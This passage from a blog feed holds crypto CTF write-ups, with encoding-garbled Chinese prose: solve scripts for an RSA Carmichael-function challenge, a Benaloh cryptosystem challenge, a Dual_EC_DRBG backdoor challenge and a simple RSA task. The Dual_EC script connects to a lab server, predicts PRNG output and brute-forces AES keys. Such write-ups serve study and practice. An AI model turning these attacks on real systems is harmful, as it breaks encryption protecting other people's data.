    <content type="html"><![CDATA[<p>åšé¢˜</p><span id="more"></span><h1 id="cycling"><a href="#cycling" class="headerlink" title="cycling"></a>cycling</h1><h2 id="Carmichael-function"><a href="#Carmichael-function" class="headerlink" title="Carmichael function"></a>Carmichael function</h2><script type="math/tex; mode=display">å®šä¹‰ä¸ºa^{m} \equiv 1 \;mod\;næˆç«‹çš„æœ€å°æ­£æ•´æ•°m ï¼Œå…¶ä¸­( a , n ) = 1 ï¼Œå°†mè®°ä½œ\lambda(n)\\ æ¢è¨€ä¹‹ï¼Œå¦‚æœa^{m} \equiv 1 \;mod\;nï¼Œåˆ™m\;|\;\lambda(n)</script><h2 id="Carmichaelå®šç†"><a href="#Carmichaelå®šç†" class="headerlink" title="Carmichaelå®šç†"></a>Carmichaelå®šç†</h2><script type="math/tex; mode=display">\lambda(p^r)=\left\{\begin{aligned}& \varphi(p^r) \;if\;p^r = \;2,3^r,4,5^r,7^rç­‰å¥‡æ•°ç´ æ•°ä»¥åŠ2ã€4 \\& \frac{1}{2}\varphi(p^r) \;if\;p^r = \;8,16,32,64ç­‰2çš„3æ¬¡å¹‚ä»¥ä¸Š\\\end{aligned}\right.</script><h2 id="è®¡ç®—-lambda-n"><a href="#è®¡ç®—-lambda-n" class="headerlink" title="è®¡ç®—\lambda(n)"></a>è®¡ç®—<script type="math/tex">\lambda(n)</script></h2><p>ç”±æ•´æ•°åˆ†è§£å®šç†</p><script type="math/tex; mode=display">n = p{_{1}^{r_1}}p{_{2}^{r_2}}Â·Â·Â·p{_{n}^{r_n}}</script><p>é‚£ä¹ˆ</p><script type="math/tex; mode=display">\lambda(n) = lcm(\lambda(p{_{1}^{r_1}}),\lambda(p{_{2}^{r_2}}),Â·Â·Â·,\lambda(p{_{n}^{r_n}}))</script><p>h+1æ˜“åˆ†è§£ä¸º17ä¸ªå°ç´ æ•°ï¼Œä¸”æ²¡æœ‰2æ¬¡åŠä»¥ä¸Šçš„ç´ æ•°</p><script type="math/tex; mode=display">\because h+1\; |\;\lambda(\lambda(n))\\\therefore ç”¨primesç›¸ä¹˜+1åˆ¤æ–­æ˜¯å¦ä¸ºç´ æ•°ï¼Œå¹¶å‡‘å‡ºå¯èƒ½çš„\lambda(n)\\</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1</span></span><br><span class="line">ct = <span class="number">0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680</span></span><br><span class="line">h = <span class="number">2</span>**<span class="number">1025</span> - <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">r&#x27;http://factordb.com/api&#x27;</span>, params=&#123;<span class="string">&quot;query&quot;</span>: <span class="built_in">str</span>(h + <span class="number">1</span>)&#125;)</span><br><span class="line"></span><br><span class="line">primes = [<span class="built_in">int</span>(_[<span class="number">0</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> response.json().get(<span class="string">&quot;factors&quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> prod(primes) == h + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cands = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="built_in">len</span>(primes))):</span><br><span class="line">    tmp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">        <span class="keyword">if</span> k % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            tmp *= primes[i]</span><br><span class="line">        k //= <span class="number">2</span></span><br><span class="line">    tmp += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> is_prime(tmp):</span><br><span class="line">        cands.append(tmp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># check</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(cands))):</span><br><span class="line">    tmp_p = cands[i]</span><br><span class="line">    <span class="keyword">assert</span> is_prime(tmp_p)</span><br><span class="line">    <span class="keyword">assert</span> (h + <span class="number">1</span>) % (tmp_p - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">L = prod(cands)</span><br><span class="line">d = <span class="built_in">int</span>(<span class="built_in">pow</span>(e, -<span class="number">1</span>, L))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(ct, d, n))))</span><br></pre></td></tr></table></figure><h1 id="benaloh"><a href="#benaloh" class="headerlink" title="benaloh"></a>benaloh</h1><p> public key cryptosystemsï¼Œ which is homomorphic.</p><h2 id="Key-Generation"><a href="#Key-Generation" class="headerlink" title="Key Generation"></a>Key Generation</h2><p>Given block size <em>r</em>, a public/private key pair is generated as follows:</p><ol><li><p>Choose large primes <em>p</em> and <em>q</em> such that <em>r | (p-1)</em>,  <em>gcd(r,  (p-1)/r) = 1</em>, and <em>gcd (r,(q - 1)) = 1</em>;</p></li><li><p>set <script type="math/tex">n = pq,  \phi = (p-1)(q-1)</script></p></li><li><script type="math/tex; mode=display">choose y \in Z{^*_n}\quad such\;that\;y^{\phi/r} \not\equiv1\;mod\;n</script><p><strong>Note:</strong> If <em>r</em> is composite, it was pointed out by Fousse et al. in 2011that the above conditions (i.e., those stated in the original paper) are insufficient to guarantee correct decryption</p></li><li><p>Set <script type="math/tex">x\;=\;y^{\phi/r}\;mod\;n</script></p><p>The public key is then <script type="math/tex">{\displaystyle y,n}</script>, and the private key is <script type="math/tex">{\displaystyle \phi ,x}</script></p></li></ol><h2 id="Message-Encryption"><a href="#Message-Encryption" class="headerlink" title="Message Encryption"></a>Message Encryption</h2><p>To encrypt message <script type="math/tex">m\in Z_r</script>:</p><ol><li>Choose a random <script type="math/tex">u \in Z{_n^*}</script>;</li><li>set <script type="math/tex">E_r(m) = y^mu^r\;mod\;n</script></li></ol><h2 id="Message-Decryption"><a href="#Message-Decryption" class="headerlink" title="Message Decryption"></a>Message Decryption</h2><p>To decrypt message <script type="math/tex">c\in Z{_n^*}</script>:</p><ol><li>comupte <script type="math/tex">a = c ^{\phi/r} \;mod n</script></li><li>output <script type="math/tex">m = log_x(a)</script>, i.e.,find m such that <script type="math/tex">x^m \;\equiv1 \; mod n</script></li></ol><p>Baby-step giant-step algorithm can be used to recover m in <script type="math/tex">O(\sqrt{r})</script> time and space</p><p>é¢˜é‡Œuæ˜¯ç”¨lcgä¾æ¬¡ç”Ÿæˆçš„ï¼Œæ¯å››ä½å¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯†ã€‚æˆ‘ä»¬å¯ä»¥çŸ¥é“å‰å‡ ç»„maskçš„å€¼ï¼Œæ‰€ä»¥ç›¸å½“äºæœ‰4ç»„ï¼ˆæ›´å¤šçº¦å‡ºæ¥ä¹Ÿæ˜¯è¿™æ ·çš„ï¼‰ä¸‰å…ƒæ–¹ç¨‹ã€‚ä¸ºäº†æ›´å¥½çš„æ±‚æ ¹ï¼Œè¿™é‡Œä½¿ç”¨<script type="math/tex">GrÃ–bner</script>åŸºï¼Œæ‰¾åˆ°ä¸€ç»„å¤šé¡¹å¼ç†æƒ³çš„çº¦åŒ–ã€‚æ±‚å‡ºçš„<script type="math/tex">GrÃ–bner</script>åŸºæœ‰ä»¥ä¸‹å½¢å¼ï¼š</p><script type="math/tex; mode=display">c^{17} + B_0 = 0\\u + B_1*c=0\\a + B_2=0</script><p>åˆç”±lcgçš„æ¨å¯¼æœ‰ï¼š</p><script type="math/tex; mode=display">x_{i+1}=ax_i+c=-B_2x_i+c=...=C_{i+1}c\\æ‰€ä»¥x{_{i}^{17}}=(C_ic)^{17}=C{_i^{17}}c^{17}=C{_i^{17}}(-B_0)\\è€ŒC_iå·²çŸ¥ï¼Œå› æ­¤å¯æ±‚è§£</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">n, y = <span class="built_in">eval</span>(f.readline())</span><br><span class="line">R = Integers(n)</span><br><span class="line">z = <span class="built_in">list</span>(<span class="built_in">map</span>(R, f.readlines()))</span><br><span class="line"></span><br><span class="line">y = R(y)</span><br><span class="line">log = &#123;y^i: <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r)&#125;</span><br><span class="line"></span><br><span class="line">P.&lt;u, a, c&gt; = PolynomialRing(R)</span><br><span class="line"></span><br><span class="line">G = []</span><br><span class="line">f = u</span><br><span class="line"><span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">b&#x27;di&#x27;</span>.<span class="built_in">hex</span>()):</span><br><span class="line">G.append(f^r - z[i]/y^<span class="built_in">int</span>(m, <span class="number">16</span>))</span><br><span class="line">f = a*f + c</span><br><span class="line"></span><br><span class="line">B = Ideal(G).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(B)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = -B[<span class="number">1</span>].monomial_coefficient(c)*c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(z)):</span><br><span class="line">flag += log[z[i]/(f.monomial_coefficient(c)^r*(-B[<span class="number">0</span>].constant_coefficient()))]</span><br><span class="line">f = -B[<span class="number">2</span>].constant_coefficient()*f + c</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;åšé¢˜&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="Carmichael function" scheme="http://sh1k4ku.github.io/tags/Carmichael-function/"/>
    
  </entry>
  
  <entry>
    <title>åˆ†åŒºèµ›</title>
    <link href="http://sh1k4ku.github.io/2022/06/27/2022/%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
    <id>http://sh1k4ku.github.io/2022/06/27/2022/%E5%88%86%E5%8C%BA%E8%B5%9B/</id>
    <published>2022-06-26T16:00:00.000Z</published>
    <updated>2022-06-28T08:43:26.601Z</updated>
    
    <content type="html"><![CDATA[<p>é¢˜ä¸éš¾ï¼Œè¦æŸ¥æ‰¾ä¿¡æ¯andç¨³ä½å¿ƒæ€</p><span id="more"></span><h1 id="dual"><a href="#dual" class="headerlink" title="dual"></a>dual</h1><p>å‰ä¸€éƒ¨åˆ†æ˜¯è¦ç”¨xyæ±‚æ¤­åœ†æ›²çº¿çš„ç”Ÿæˆå‚æ•°ï¼›</p><p>åä¸€éƒ¨åˆ†æ˜¯NSAçš„åé—¨ï¼Œæ˜¯ä¸€ä¸ªéšæœºæ•°å‘ç”Ÿå™¨ï¼Œç”¨ä¸€ç³»åˆ—è²Œä¼¼éšæœºçš„æ•°å’Œæ¤­åœ†ä¸Šçš„ç‚¹åšä¹˜ç§¯ï¼Œæœ€åè¾“å‡ºä½240ä½ä½œä¸ºæ¯ä¸€è½®çš„ç»“æœã€‚å› ä¸ºP, Qæ˜¯å›ºå®šçš„ï¼Œæ¤­åœ†æ›²çº¿çš„å‚æ•°ä¹Ÿæ˜¯å›ºå®šçš„ï¼ŒPã€Qä¹‹é—´å¿…ç„¶å­˜åœ¨ä¸€ä¸ªçº¿æ€§å…³ç³»ï¼Œé‚£ä¹ˆå°±ç”¨è¿™ä¸ªçº¿æ€§å…³ç³»å»é¢„æµ‹ä¸‹ä¸€æ¬¡çš„ç»“æœã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from sys import stdout</span><br><span class="line">from fastecdsa.curve import P256</span><br><span class="line">from fastecdsa.point import Point</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from tqdm import trange</span><br><span class="line"></span><br><span class="line">VERBOSE = True</span><br><span class="line"></span><br><span class="line">G = P256.G</span><br><span class="line"></span><br><span class="line">def pad(s):</span><br><span class="line">    return s + (16 - len(s) % 16) * b&quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">class PRNG:</span><br><span class="line">    def __init__(self, e, seed):</span><br><span class="line">        self.state = seed</span><br><span class="line">        self.Q = e * G</span><br><span class="line">        self.P = G</span><br><span class="line">        self.mask = 2**240 - 1</span><br><span class="line">        </span><br><span class="line">    def gen(self):</span><br><span class="line">        new_point = self.state * self.P</span><br><span class="line">        r = new_point.x</span><br><span class="line">        self.state = r</span><br><span class="line">        ret = r * self.Q</span><br><span class="line">        return ret.x &amp; self.mask</span><br><span class="line"></span><br><span class="line">def p256_mod_sqrt(c):</span><br><span class="line">    p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span><br><span class="line">    t1 = pow(c, 2, p)</span><br><span class="line">    t1 = (t1 * c) % p</span><br><span class="line">    t2 = pow(t1, 2**2, p)</span><br><span class="line">    t2 = (t2 * t1) % p</span><br><span class="line">    t3 = pow(t2, 2**4, p)</span><br><span class="line">    t3 = (t3 * t2) % p</span><br><span class="line">    t4 = pow(t3, 2**8, p)</span><br><span class="line">    t4 = (t4 * t3) % p</span><br><span class="line">    r = pow(t4, 2**16, p)</span><br><span class="line">    r = (r * t4) % p</span><br><span class="line">    r = pow(r, 2**32, p)</span><br><span class="line">    r = (r * c) % p</span><br><span class="line">    r = pow(r, 2**96, p)</span><br><span class="line">    r = (r * c) % p</span><br><span class="line">    return pow(r, 2**94, p)</span><br><span class="line"></span><br><span class="line">def find_point_on_p256(x):</span><br><span class="line">    # equation: y^2 = x^3-ax+b</span><br><span class="line">    y2 = (x * x * x) - (3 * x) + P256.b</span><br><span class="line">    y2 = y2 % P256.p</span><br><span class="line">    y = p256_mod_sqrt(y2)</span><br><span class="line">    return y2 == (y * y) % P256.p, y</span><br><span class="line"></span><br><span class="line">class Solve:</span><br><span class="line">    def __init__(self) -&gt; None:</span><br><span class="line">        self.conn = remote(&#x27;192.168.0.64&#x27;, 58010)</span><br><span class="line">        self.n = 15</span><br><span class="line">    </span><br><span class="line">    def s_3(self):</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">        </span><br><span class="line">        x0 = eval(self.conn.recvline())</span><br><span class="line">        x = eval(self.conn.recvline())</span><br><span class="line">        y = eval(self.conn.recvline())</span><br><span class="line">        x1 = x[:self.n]</span><br><span class="line">        x2 = x[self.n:]</span><br><span class="line">        p_list = []</span><br><span class="line">        PR = PolynomialRing(Zmod(x0), &#x27;x&#x27;)</span><br><span class="line">        x_ = PR.gen()</span><br><span class="line">        f = x_ + y</span><br><span class="line">        sol = f.small_roots(X=2**20, beta=1./20)</span><br><span class="line">        p_list = [ZZ(gcd(t + y, x0)) for t in sol]</span><br><span class="line">        print(len(p_list))</span><br><span class="line">        e = min(p_list)</span><br><span class="line">        # print(set(p0) == set(p_list))</span><br><span class="line">        return e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def gen_prediction(self, observed, Q, d):</span><br><span class="line">        ret = []</span><br><span class="line">        for high_bits in trange(2**15): # 2**16: have sol, 2**15: 1/2 prob</span><br><span class="line">            guess = (high_bits &lt;&lt; (8 * 30)) | observed</span><br><span class="line">            on_curve, y = find_point_on_p256(guess)</span><br><span class="line"></span><br><span class="line">            if on_curve:</span><br><span class="line">                # use the backdoor to guess the next 30 bytes</span><br><span class="line">                point = Point(guess, y, curve=P256)</span><br><span class="line">                s = (d * point).x</span><br><span class="line">                r = (s * Q).x &amp; (2**(8 * 30) - 1)</span><br><span class="line">                ret.append(r)</span><br><span class="line"></span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def s_pred(self, e):</span><br><span class="line">        d = int(inverse(e, P256.q))</span><br><span class="line">        Q = e * G</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)</span><br><span class="line">        observed = eval(self.conn.recvline())</span><br><span class="line">        # print(guess)</span><br><span class="line">        # pred = eval(self.conn.recvline())</span><br><span class="line">        # print(pred)</span><br><span class="line">        predicted = self.gen_prediction(observed, Q, d)</span><br><span class="line">        # print(len(predicted))</span><br><span class="line">        # print(pred in predicted)</span><br><span class="line">        </span><br><span class="line">        return predicted</span><br><span class="line">    </span><br><span class="line">    def s_2(self, pred):</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line">        self.conn.recvuntil(&#x27;ct: &#x27;)</span><br><span class="line">        ct = self.conn.recvline().strip()</span><br><span class="line">        ct = base64.b64decode(ct)</span><br><span class="line">        for nx in pred:</span><br><span class="line">            key = pad(long_to_bytes(nx))</span><br><span class="line">            cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">            pt = cipher.decrypt(ct)</span><br><span class="line">            if (all(64 &lt; x &lt; 128 for x in pt)):</span><br><span class="line">                print(pt)</span><br><span class="line">                self.conn.sendlineafter(&#x27;pt:&#x27;, base64.b64encode(pt))</span><br><span class="line">                self.conn.interactive()</span><br><span class="line">                return True</span><br><span class="line">        else:</span><br><span class="line">            self.conn.close()</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def s(self):</span><br><span class="line">        e = int(self.s_3())</span><br><span class="line">        pred = self.s_pred(e)</span><br><span class="line">        if (pred == 0):</span><br><span class="line">            self.conn.close()</span><br><span class="line">            return False</span><br><span class="line">        is_success = self.s_2(pred)</span><br><span class="line">        return is_success</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    while True:</span><br><span class="line">        print(&#x27;Begin try...&#x27;)</span><br><span class="line">        s = Solve()</span><br><span class="line">        is_success = s.s()</span><br><span class="line">        if (is_success):</span><br><span class="line">            break</span><br><span class="line">        print(&#x27;Failed&#x27;)</span><br></pre></td></tr></table></figure><p>å› ä¸ºç¯å¢ƒé—®é¢˜æœ€ååœ¨é˜Ÿå‹ç”µè„‘ä¸Šå‡ºçš„â€”</p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>é€åˆ†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">lcm = <span class="number">4292158730589770192682795435047249488185453170529228019750042608688907718268448193363838203887391025871515871000364259326343790645215256385842265899206372365402431198699714374850409466996627163968391249416054093529090485677808301343590811445080871279796162536469847469761747058736980603093722710824453312207182881241846080117790728778291633761198069016865260030288832065807438020772711645648333908622890343009942617559434851450007195025869850769670769715654662127278293639938359741401336592219730356884542179574372134014927006215640945952229142436595334916765255426954857520777553915330597952622785359222832224632624</span></span><br><span class="line">c = <span class="number">4288727484183191191687364666620023549392656794153112764357730676861570386983002380982803054964588111708662498647767438881892355599604826306427809017097724346976778230464708540600157055782723189971534549543664668430013171469625043063261219462210251726207552819381767396148632877168530609902046293626355744288863460554297860696918890189350721960355460410677203131993419723440382095665713164422367291153108363066159712951217816814873413423853338021627653555202253351957999686659021298525147460016557904084617528199284448056532965033560516083489693334373695545423561715471204868795248569806148395196572046378679014697206</span></span><br><span class="line">N  = <span class="number">17168634922359080770731181740188997952741812682116912079000170434755630873073792773455352815549564103486063484001457037305375162580861025543369063596825489461609724794798857499401637867986508655873564997664216374116361942711233205374363245780323485119184650145879389879046988234947922412374890843297813248828996855478005656041814919367820336728271583686844991928889831691815821365423570311291064846736832327637944358854661523107817781673029406341843040857813841671405147146887291204140157388049394514390098066284975682117038362207142272098796924412602725857521665773622056312191400612944442008222587867782281556388669</span></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(E, lcm)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5(long_to_bytes(<span class="built_in">pow</span>(c,d,N))).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¢˜ä¸éš¾ï¼Œè¦æŸ¥æ‰¾ä¿¡æ¯andç¨³ä½å¿ƒæ€&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="ECC" scheme="http://sh1k4ku.github.io/tags/ECC/"/>
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šä¸€ç§’é’Ÿã€‹è§‚åæ„Ÿ</title>
    <link href="http://sh1k4ku.github.io/2022/05/17/2022/%E3%80%8A%E4%B8%80%E7%A7%92%E9%92%9F%E3%80%8B%E8%A7%82%E5%90%8E%E6%84%9F/"/>
    <id>http://sh1k4ku.github.io/2022/05/17/2022/%E3%80%8A%E4%B8%80%E7%A7%92%E9%92%9F%E3%80%8B%E8%A7%82%E5%90%8E%E6%84%9F/</id>
    <published>2022-05-17T13:53:52.000Z</published>
    <updated>2022-05-17T14:45:42.750Z</updated>
    
